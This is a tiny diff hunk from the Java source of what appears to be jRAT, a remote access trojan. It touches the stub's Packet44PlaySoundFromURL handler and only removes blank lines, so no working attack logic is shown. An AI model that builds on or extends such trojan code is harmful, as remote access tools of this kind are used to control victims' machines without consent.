@@ -9,8 +9,6 @@ import javax.sound.sampled.Clip;
 import pro.jrat.common.codec.Hex;
 import pro.jrat.stub.Connection;
 
-
-
 public class Packet44PlaySoundFromURL extends AbstractIncomingPacket {
 
 	@Override
